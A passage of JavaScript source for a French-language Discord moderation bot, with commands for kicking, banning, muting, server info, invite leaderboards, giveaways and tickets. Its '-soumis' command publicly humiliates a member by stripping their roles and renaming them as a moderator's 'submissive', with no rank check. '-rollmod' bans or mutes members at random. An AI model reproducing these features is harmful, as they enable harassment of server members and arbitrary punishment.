        let id = query ? query.replace(/[<@!>]/g, '') : null;
        if (id) {
            try {
                return await client.users.fetch(id);
            } catch {
                // On peut tenter la réponse si l'ID échoue
            }
        }
        if (!id && message.reference) {
            try {
                const repliedMsg = await message.channel.messages.fetch(message.reference.messageId);
                return repliedMsg.author;
            } catch {
                return null;
            }
        }
        return null;
    };

    // Command: -kick
    if (command === 'kick') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur, donner son ID ou répondre à son message.');
        if (target.roles.highest.position >= message.member.roles.highest.position) return message.reply('Vous ne pouvez pas kick un membre ayant un rôle supérieur ou égal au vôtre.');
        if (!target.kickable) return message.reply('Je ne peux pas kick cet utilisateur.');

        const allowed = await checkQuota(message.author.id, 'kick');
        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Vous avez dépassé votre limite d\'actions modération pour cette heure. Contactez un administrateur.');

        const replyId = message.reference ? message.reference.messageId : 'none';
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Modération : Kick')
            .setDescription(`Veuillez sélectionner une raison pour kick **${target.user.tag}**.`);

        const select = new StringSelectMenuBuilder()
            .setCustomId(`kick_${target.id}_${replyId}`)
            .setPlaceholder('Choisir une raison...')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
                new StringSelectMenuOptionBuilder().setLabel('Spam / Flood').setValue('spam'),
                new StringSelectMenuOptionBuilder().setLabel('Insultes / Manque de respect').setValue('insultes'),
                new StringSelectMenuOptionBuilder().setLabel('Fake').setValue('fake'),
                new StringSelectMenuOptionBuilder().setLabel('Mineur').setValue('mineur'),
                new StringSelectMenuOptionBuilder().setLabel('Scam').setValue('scam'),
                new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
            );

        const row = new ActionRowBuilder().addComponents(select);
        await message.channel.send({ embeds: [embed], components: [row] });
    }

    // Command: -ban
    if (command === 'ban') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur, donner son ID ou répondre à son message.');
        if (target.roles.highest.position >= message.member.roles.highest.position) return message.reply('Vous ne pouvez pas bannir un membre ayant un rôle supérieur ou égal au vôtre.');
        if (!target.bannable) return message.reply('Je ne peux pas ban cet utilisateur.');

        const allowed = await checkQuota(message.author.id, 'ban');
        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Vous avez dépassé votre limite de bannissements pour cette heure.');

        const replyId = message.reference ? message.reference.messageId : 'none';
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Modération : Ban')
            .setDescription(`Veuillez sélectionner une raison pour bannir **${target.user.tag}**.`);

        const select = new StringSelectMenuBuilder()
            .setCustomId(`ban_${target.id}_${replyId}`)
            .setPlaceholder('Choisir une raison...')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
                new StringSelectMenuOptionBuilder().setLabel('Troll / Raid').setValue('troll'),
                new StringSelectMenuOptionBuilder().setLabel('Publicité non autorisée').setValue('pub'),
                new StringSelectMenuOptionBuilder().setLabel('Fake').setValue('fake'),
                new StringSelectMenuOptionBuilder().setLabel('Mineur').setValue('mineur'),
                new StringSelectMenuOptionBuilder().setLabel('Scam').setValue('scam'),
                new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
            );

        const row = new ActionRowBuilder().addComponents(select);
        await message.channel.send({ embeds: [embed], components: [row] });
    }

    // Command: -bban
    if (command === 'bban') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur, donner son ID ou répondre à son message.');
        if (target.roles.highest.position >= message.member.roles.highest.position) return message.reply('Vous ne pouvez pas bannir ce membre.');
        if (!target.bannable) return message.reply('Je ne peux pas ban cet utilisateur.');

        const allowed = await checkQuota(message.author.id, 'ban');
        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Limite atteinte.');

        let reason = 'Ban rapide (-bban)';
        if (message.reference) {
            const repliedMsg = await message.channel.messages.fetch(message.reference.messageId).catch(() => null);
            if (repliedMsg) {
                reason += ` | Message répondu: ${repliedMsg.content.substring(0, 100) || 'Image/Embed'}`;
            }
        }

        await sendModDM(target, 'Ban Rapide', reason);
        await target.ban({ reason });
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target.user.tag} a été banni rapidement.`);
        message.channel.send({ embeds: [embed] });
        logModAction('🔨 Sanction : Ban Rapide', message.author, target, 'Ban Rapide', reason, 0xFF0000, message.channel);
    }

    // Command: -clear
    if (command === 'clear') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const amount = parseInt(args[0]);
        if (isNaN(amount) || amount < 1 || amount > 100) {
            return message.reply('Veuillez spécifier un nombre entre 1 et 100.');
        }

        await message.channel.bulkDelete(amount, true);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${amount} messages supprimés.`);
        const msg = await message.channel.send({ embeds: [embed] });
        setTimeout(() => msg.delete(), 3000);
        logModAction('🧹 Nettoyage', message.author, null, 'Clear', `${amount} messages`, 0x00FFFF, message.channel);
    }

    // Command: -tempmute
    if (command === 'tempmute' || command === 'mute') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -tempmute @user/ID (ou répondez à un message)');

        const allowed = await checkQuota(message.author.id, 'mute');
        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Trop d\'actions (mute) récemment.');

        const replyId = message.reference ? message.reference.messageId : 'none';
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Modération : Tempmute')
            .setDescription(`Veuillez sélectionner une raison pour mute **${target.user.tag}**.`);

        const select = new StringSelectMenuBuilder()
            .setCustomId(`mutereason_${target.id}_${replyId}`)
            .setPlaceholder('Choisir une raison...')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
                new StringSelectMenuOptionBuilder().setLabel('Spam / Flood').setValue('spam'),
                new StringSelectMenuOptionBuilder().setLabel('Fake').setValue('fake'),
                new StringSelectMenuOptionBuilder().setLabel('Mineur').setValue('mineur'),
                new StringSelectMenuOptionBuilder().setLabel('Scam').setValue('scam'),
                new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
            );

        const row = new ActionRowBuilder().addComponents(select);
        await message.channel.send({ embeds: [embed], components: [row] });
    }

    // Command: -mmute
    if (command === 'mmute') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -mmute @user/ID (ou répondez à un message)');

        let reason = 'Automatique 24h (-mmute)';
        if (message.reference) {
            const repliedMsg = await message.channel.messages.fetch(message.reference.messageId).catch(() => null);
            if (repliedMsg) {
                reason += ` | Message répondu: ${repliedMsg.content.substring(0, 100) || 'Image/Embed'}`;
            }
        }

        await sendModDM(target, 'Mute 24h', reason);
        await target.timeout(86400000, reason); // 24h
        const allowed = await checkQuota(message.author.id, 'mute');
        if (!allowed) return message.reply('⚠️ Quota atteint.');

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target.user.tag} a été mute pour 24 heures.`);
        message.channel.send({ embeds: [embed] });
        logModAction('🔇 Sanction : Mute 24h', message.author, target, 'Mute 24h', reason, 0xFFFF00, message.channel);
    }

    // Command: -unmute
    if (command === 'unmute') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -unmute @user/ID');
        if (!target.isCommunicationDisabled()) return message.reply('Cet utilisateur n\'est pas mute.');

        await target.timeout(null, `Unmute par ${message.author.tag}`);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target.user.tag} a été unmute.`);
        message.channel.send({ embeds: [embed] });
        logModAction('🔊 Sanction : Unmute', message.author, target, 'Unmute', 'Manuel', 0x00FF00, message.channel);
    }

    // Command: -soumis
    if (command === 'soumis') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageRoles) && !message.member.roles.cache.has('1483882841216385187')) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');

        let soumisRole = message.guild.roles.cache.find(r => r.name === 'Soumis');
        if (!soumisRole) {
            soumisRole = await message.guild.roles.create({
                name: 'Soumis',
                color: '#FFFFFF',
                permissions: [],
                reason: 'Role pour le système de soumis',
            });

            // Try to deny SendMessages in all channels for this role
            message.guild.channels.cache.forEach(async (channel) => {
                if (channel.isTextBased()) {
                    await channel.permissionOverwrites.create(soumisRole, {
                        SendMessages: false,
                        AddReactions: false,
                        CreatePublicThreads: false,
                        CreatePrivateThreads: false,
                        SendMessagesInThreads: false,
                    }).catch(() => {});
                }
            });
        }

        // Save current roles and nickname to DB
        await db.query(
            'INSERT INTO soumis_data (user_id, roles, nickname) VALUES ($1, $2, $3) ON CONFLICT (user_id) DO UPDATE SET roles = EXCLUDED.roles, nickname = EXCLUDED.nickname',
            [target.id, JSON.stringify(target.roles.cache.filter(r => r.name !== '@everyone').map(r => r.id)), target.nickname || null]
        );

        // Remove all roles, add soumis, and change nickname
        await sendModDM(target, 'Soumis', `Vous êtes maintenant le soumis de ${message.author.username}`);
        await target.roles.set([soumisRole.id]);
        await target.setNickname(`Soumis de ${message.author.username}`).catch(() => {});

        message.channel.send(`${target} est maintenant le soumis de ${message.author}`);
    }

    // Command: -unsoumis
    if (command === 'unsoumis') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageRoles)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');

        const res = await db.query('SELECT * FROM soumis_data WHERE user_id = $1', [target.id]);
        const oldData = res.rows[0];

        if (!oldData) return message.reply('Aucun ancien rôle trouvé pour cet utilisateur.');

        // Support for roles stored as JSONB
        const rolesToRestore = oldData.roles;
        const nicknameToRestore = oldData.nickname;

        await sendModDM(target, 'Libération', "Vous n'êtes plus soumis.");
        await target.roles.set(rolesToRestore);
        if (nicknameToRestore !== undefined) {
            await target.setNickname(nicknameToRestore).catch(() => {});
        }
        
        await db.query('DELETE FROM soumis_data WHERE user_id = $1', [target.id]);

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target.user.tag} n'est plus soumis et a récupéré ses rôles.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -pic
    if (command === 'pic') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const target = (await getUser(args[0])) || message.author;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Avatar de ${target.tag}`)
            .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }));
        message.channel.send({ embeds: [embed] });
    }

    // Command: -banner
    if (command === 'banner') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const targetUser = (await getUser(args[0])) || message.author;
        const user = await client.users.fetch(targetUser.id, { force: true });
        
        if (!user.bannerURL()) return message.reply('Cet utilisateur n\'a pas de bannière.');

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Bannière de ${user.tag}`)
            .setImage(user.bannerURL({ dynamic: true, size: 1024 }));
        message.channel.send({ embeds: [embed] });
    }

    // Command: -userinfo
    if (command === 'userinfo') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const target = (await getMember(args[0])) || message.member;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Informations sur ${target.user.tag}`)
            .addFields(
                { name: 'ID', value: target.id, inline: true },
                { name: 'Surnom', value: target.displayName || 'Aucun', inline: true },
                { name: 'Rejoint le', value: target.joinedAt ? target.joinedAt.toLocaleDateString() : 'Inconnu', inline: true },
                { name: 'Compte créé le', value: target.user.createdAt.toLocaleDateString(), inline: true }
            )
            .setThumbnail(target.user.displayAvatarURL());
        message.channel.send({ embeds: [embed] });
    }

    // Command: -serverinfo
    if (command === 'serverinfo') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const guild = message.guild;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Informations sur ${guild.name}`)
            .addFields(
                { name: 'Propriétaire', value: `<@${guild.ownerId}>`, inline: true },
                { name: 'Membres', value: `${guild.memberCount}`, inline: true },
                { name: 'Créé le', value: guild.createdAt.toLocaleDateString(), inline: true },
                { name: 'Boosts', value: `${guild.premiumSubscriptionCount || 0}`, inline: true }
            )
            .setThumbnail(guild.iconURL());
        message.channel.send({ embeds: [embed] });
    }

    // Command: -members
    if (command === 'members') {
        const humans = message.guild.members.cache.filter(m => !m.user.bot).size;
        const bots = message.guild.members.cache.filter(m => m.user.bot).size;
        const onlineCount = message.guild.members.cache.filter(m => m.presence?.status !== 'offline').size;

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`📊 Statistiques des Membres - ${message.guild.name}`)
            .addFields(
                { name: '👥 Total', value: `\`${message.guild.memberCount}\``, inline: true },
                { name: '👤 Humains', value: `\`${humans}\``, inline: true },
                { name: '🤖 Bots', value: `\`${bots}\``, inline: true },
                { name: '🟢 En ligne', value: `\`${onlineCount}\``, inline: true }
            )
            .setThumbnail(message.guild.iconURL({ dynamic: true }))
            .setFooter({ text: `Demandé par ${message.author.tag}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) })
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // Command: -boost
    if (command === 'boost') {
        const guild = message.guild;
        const embed = new EmbedBuilder()
            .setColor(0xFF73FA) // Pink Boost Color
            .setTitle(`💎 Soutien Boost - ${guild.name}`)
            .setDescription(`Le serveur est actuellement au **niveau ${guild.premiumTier}** avec **${guild.premiumSubscriptionCount}** boosts.`)
            .setThumbnail('https://cdn.discordapp.com/emojis/848580665963511808.png?v=1')
            .setFooter({ text: `Merci à tous les boosters !` })
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // Command: -botinfo
    if (command === 'botinfo' || command === 'bot') {
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`🤖 Informations sur le Bot`)
            .setThumbnail(client.user.displayAvatarURL())
            .addFields(
                { name: '👑 Développeur', value: '`Doro Place Development`', inline: true },
                { name: '📡 Latence', value: `\`${client.ws.ping}ms\``, inline: true },
                { name: '📁 Serveurs', value: `\`${client.guilds.cache.size}\``, inline: true },
                { name: '🛠️ Version', value: '`1.0.0`', inline: true },
                { name: '📅 Créé le', value: `\`${client.user.createdAt.toLocaleDateString()}\``, inline: true }
            )
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // Command: -uptime
    if (command === 'uptime') {
        let totalSeconds = (client.uptime / 1000);
        let days = Math.floor(totalSeconds / 86400);
        totalSeconds %= 86400;
        let hours = Math.floor(totalSeconds / 3600);
        totalSeconds %= 3600;
        let minutes = Math.floor(totalSeconds / 60);
        let seconds = Math.floor(totalSeconds % 60);

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`⏳ Temps de fonctionnement (Uptime)`)
            .setDescription(`Le bot est en ligne depuis :\n\`${days}j ${hours}h ${minutes}m ${seconds}s\``)
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // Command: -icon
    if (command === 'icon') {
        const guild = message.guild;
        if (!guild.iconURL()) return message.reply('Ce serveur n\'a pas d\'icône.');
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Icône du serveur : ${guild.name}`)
            .setImage(guild.iconURL({ dynamic: true, size: 1024 }));
        message.channel.send({ embeds: [embed] });
    }

    // Command: -rollmod
    if (command === 'rollmod') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
        if (target.roles.highest.position >= message.member.roles.highest.position && message.author.id !== message.guild.ownerId) {
            return message.reply('Vous ne pouvez pas lancer la roue sur ce membre.');
        }

        const outcomes = [
            { name: 'Ban Définitif', weight: 2 },
            { name: 'Ban Temporaire (1J)', weight: 5 },
            { name: 'Mute 24H', weight: 8 },
            { name: 'Mute 12H', weight: 10 },
            { name: 'Mute 2H', weight: 15 },
            { name: 'Mute 1H', weight: 20 },
            { name: 'Rien du tout', weight: 35 },
            { name: '🎁 Cadeau Gagnant !', weight: 5 }
        ];

        let totalWeight = outcomes.reduce((acc, obj) => acc + obj.weight, 0);
        let random = Math.floor(Math.random() * totalWeight);
        let selected = outcomes[0];
        for (let i = 0; i < outcomes.length; i++) {
            if (random < outcomes[i].weight) {
                selected = outcomes[i];
                break;
            }
            random -= outcomes[i].weight;
        }

        const startEmbed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('🎰 Roulette de la Modération')
            .setDescription(`La roue tourne pour **${target.user.tag}**...`)
            .setTimestamp();
        
        const msg = await message.channel.send({ embeds: [startEmbed] });
        
        setTimeout(async () => {
            let resultDesc = "";
            const targetTag = target.user.tag;
            const targetId = target.id;
            const guild = message.guild;

            try {
                switch(selected.name) {
                    case 'Ban Définitif':
                        await sendModDM(target, 'Ban Définitif', 'Perdu à la Roulette de la Modération');
                        await target.ban({ reason: 'Roulette de la Modération' });
                        resultDesc = `💥 **DÉCHÉANCE !** \`${targetTag}\` a été banni définitivement !`;
                        break;
                    case 'Ban Temporaire (1J)':
                        await sendModDM(target, 'Ban 1 Jour', 'Perdu à la Roulette de la Modération. Unban automatique dans 24h.');
                        await target.ban({ reason: 'Roulette de la Modération (1j)' });
                        resultDesc = `⏳ **ÉJECTION !** \`${targetTag}\` est banni pour 1 jour.`;
                        
                        setTimeout(async () => {
                            try {
                                await guild.members.unban(targetId);
                                const user = await client.users.fetch(targetId).catch(() => null);
                                if (user) {
                                    const invites = await guild.invites.fetch();
                                    let invite = invites.filter(i => i.maxAge === 0).first();
                                    if (!invite) {
                                        const channel = guild.channels.cache.find(c => c.isTextBased() && c.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.CreateInstantInvite));
                                        if (channel) invite = await channel.createInvite({ maxAge: 0 });
                                    }
                                    await user.send(`Vous avez été unban de **${guild.name}**. Voici votre invitation : ${invite ? invite.url : 'Lien non disponible'}`).catch(() => {});
                                }
                            } catch (e) {
                                console.log('Erreur lors de l\'unban automatique rollmod:', e);
                            }
                        }, 86400000); // 24h unban
                        break;
                    case 'Mute 24H':
                        await sendModDM(target, 'Mute 24H', 'Perdu à la Roulette de la Modération');
                        await target.timeout(86400000, 'Roulette de la Modération');
                        resultDesc = `🔇 \`${targetTag}\` est réduit au silence pour 24 heures.`;
                        break;
                    case 'Mute 12H':
                        await sendModDM(target, 'Mute 12H', 'Perdu à la Roulette de la Modération');
                        await target.timeout(43200000, 'Roulette de la Modération');
                        resultDesc = `🔇 \`${targetTag}\` est réduit au silence pour 12 heures.`;
                        break;
                    case 'Mute 2H':
                        await sendModDM(target, 'Mute 2H', 'Perdu à la Roulette de la Modération');
                        await target.timeout(7200000, 'Roulette de la Modération');
                        resultDesc = `🔇 \`${targetTag}\` est réduit au silence pour 2 heures.`;
                        break;
                    case 'Mute 1H':
                        await sendModDM(target, 'Mute 1H', 'Perdu à la Roulette de la Modération');
                        await target.timeout(3600000, 'Roulette de la Modération');
                        resultDesc = `🔇 \`${targetTag}\` est réduit au silence pour 1 heure.`;
                        break;
                    case 'Rien du tout':
                        resultDesc = `🍀 **CHANCEUX !** Il ne se passe absolument rien pour \`${targetTag}\`.`;
                        break;
                    case '🎁 Cadeau Gagnant !':
                        resultDesc = `🎉 **INCROYABLE !** \`${targetTag}\` gagne un cadeau spécial ! (Contact staff)`;
                        break;
                }
            } catch (err) {
                resultDesc = `⚠️ Erreur lors de l'application du résultat (${selected.name}).`;
            }

            const resEmbed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setTitle('🎰 Roulette de la Modération : Résultat')
                .setDescription(resultDesc)
                .setTimestamp();
                
            await msg.edit({ embeds: [resEmbed] });
        }, 3000);
    }

    // Command: -help
    if (command === 'help' || command === 'aide') {
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`📜 Liste des Commandes`)
            .setDescription(`Voici les commandes disponibles sur le serveur. Le préfixe est \`${PREFIX}\``)
            .addFields(
                { name: '📊 Général', value: '`members`, `boost`, `invites`, `leaderboard`, `lb`, `botinfo`, `uptime`, `icon`, `signaler`' },
                { name: '🛠️ Administration', value: '`serverinfo`, `userinfo`, `pic`, `banner`, `clear`, `lock`, `unlock`, `slowmode`, `ping`, `setupticket`, `setupvocal`, `setupstaff`, `syncinvites`, `create`, `setupcodes`, `tirage`' },
                { name: '🛡️ Modération', value: '`kick`, `ban`, `bban`, `tempmute`, `mmute`, `unmute`, `warn`, `verif`, `vmute`, `vunmute`, `vdeaf`, `vundeaf`, `vkick`, `rollmod`' }
            )
            .setFooter({ text: 'Doro Place - Bot de Gestion' })
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // Command: -lock
    if (command === 'lock') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription('Ce salon a été verrouillé.');
        message.channel.send({ embeds: [embed] });
    }

    // Command: -unlock
    if (command === 'unlock') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription('Ce salon a été déverrouillé.');
        message.channel.send({ embeds: [embed] });
    }

    // Command: -ping
    if (command === 'ping') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`Latence: ${client.ws.ping}ms`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -slowmode
    if (command === 'slowmode') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const seconds = parseInt(args[0]);
        if (isNaN(seconds)) return message.reply('Veuillez spécifier un nombre de secondes.');
        await message.channel.setRateLimitPerUser(seconds);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`Mode lent activé : ${seconds} secondes.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -invites
    if (command === 'invites') {
        const target = (await getMember(args[0])) || message.member;
        
        const res = await db.query('SELECT COUNT(*) FROM invites WHERE inviter_id = $1 AND active = TRUE', [target.id]);
        const activeInvites = parseInt(res.rows[0].count);

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Invitations de ${target.user.tag}`)
            .setDescription(`Cet utilisateur possède **${activeInvites}** invitation${activeInvites > 1 ? 's' : ''} (membres actuellement sur le serveur).`);
        message.reply({ embeds: [embed] });
    }

    // Command: -leaderboard
    if (command === 'leaderboard' || command === 'lb') {
        const type = args[0] || 'invites';
        
        if (type === 'invites') {
            const res = await db.query(`
                SELECT inviter_id, COUNT(*) as invite_count 
                FROM invites 
                WHERE active = TRUE 
                GROUP BY inviter_id 
                ORDER BY invite_count DESC 
                LIMIT 10
            `);

            if (res.rows.length === 0) {
                return message.reply('Aucune donnée d\'invitation disponible.');
            }

            let description = "";
            for (let i = 0; i < res.rows.length; i++) {
                const row = res.rows[i];
                const user = await client.users.fetch(row.inviter_id).catch(() => null);
                const tag = user ? user.username : `ID: ${row.inviter_id}`;
                description += `**${i + 1}.** ${tag} — \`${row.invite_count}\` invitation(s)\n`;
            }

            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setTitle('🏆 Classement des Invitations')
                .setDescription(description || 'Aucun membre dans le classement.')
                .setFooter({ text: 'Seules les invitations actives sont comptabilisées.' })
                .setTimestamp();
            
            message.channel.send({ embeds: [embed] });
        } else {
            message.reply('Usage : `-leaderboard invites` ou `-lb invites`');
        }
    }

    // Command: -syncinvites (Admin only)
    if (command === 'syncinvites') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        
        await message.reply("🔄 Synchronisation des invitations en cours... Cela peut prendre un moment.");
        
        const allInvites = await db.query('SELECT invited_member_id FROM invites');
        let synced = 0;
        
        // Fetch all members to avoid multiple API calls during check
        await message.guild.members.fetch();
        
        for (const row of allInvites.rows) {
            const isPresent = message.guild.members.cache.has(row.invited_member_id);
            await db.query('UPDATE invites SET active = $1 WHERE invited_member_id = $2', [isPresent, row.invited_member_id]);
            synced++;
        }
        
        message.channel.send(`✅ Synchronisation terminée ! **${synced}** entrées mises à jour.`);
    }

    // Command: -giveaways
    if (command === 'giveaways' || command === 'giveaway') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        
        const allowed = await checkQuota(message.author.id, 'giveaway', 1, 86400000); // 1 per 24h
        if (!allowed && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('⚠️ **Alerte Quota** : Vous avez déjà lancé un giveaway aujourd\'hui (limite de 1 par jour).');
        }

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('🎁 Créateur de Giveaway')
            .setDescription('Configurez votre giveaway. Utilisez les boutons ci-dessous.');

        // On initalize les donnés dans interactionCreate plus bas dynamiquement
        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_gw_prize').setLabel('Lot').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_gw_desc').setLabel('Description').setStyle(ButtonStyle.Secondary)
        );
        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_gw_duration').setLabel('Durée (Ex: 10m, 2h, 1d)').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_gw_winners').setLabel('Nb. Gagnants').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_gw_condition').setLabel('Condition : Rôle').setStyle(ButtonStyle.Secondary)
        );
        const row3 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('launch_gw').setLabel('Lancer 🎉').setStyle(ButtonStyle.Success)
        );

        await message.channel.send({ embeds: [embed], components: [row1, row2, row3] });
    }

    // Command: -create
    if (command === 'create') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Créateur d\'Embed')
            .setDescription('Utilisez les boutons ci-dessous pour configurer votre embed. Une fois terminé, sélectionnez le salon d\'envoi.');

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_title').setLabel('Titre').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_description').setLabel('Description').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_color').setLabel('Couleur (Hex)').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_image').setLabel('Image (URL)').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_footer').setLabel('Footer').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('preview_embed').setLabel('Aperçu').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('send_embed').setLabel('Envoyer').setStyle(ButtonStyle.Success)
        );

        await message.channel.send({ embeds: [embed], components: [row1, row2] });
    }

    // Command: -setupticket
    if (command === 'setupticket') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('🎫 Support & Assistance')
            .setDescription('Choisissez la catégorie correspondant à votre demande pour ouvrir un ticket.')
            .addFields(
                { name: '💰 Achat VIP', value: 'Pour toute question concernant l\'achat du Pass VIP.' },
                { name: '💬 Question Général', value: 'Pour vos questions diverses sur le serveur.' }
            );
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('open_ticket_vip').setLabel('Achat VIP').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('open_ticket_general').setLabel('Question Général').setStyle(ButtonStyle.Secondary)
        );
        await message.channel.send({ embeds: [embed], components: [row] });
        await message.delete();
    }

    // Command: -setupcodes
    if (command === 'setupcodes') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Récupération Pass VIP')
            .setDescription('Si vous avez acheté un Pass VIP sur notre site, cliquez sur le bouton ci-dessous pour entrer votre code.')
            .addFields({ name: 'Site Web', value: '`https://doroplace.vercel.app/`' })
            .setFooter({ text: 'Système de Validation' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('use_vip_code')
                .setLabel('Entrer un code')
                .setStyle(ButtonStyle.Success)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
        await message.delete();
    }

    // Command: -tirage
    if (command === 'tirage') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
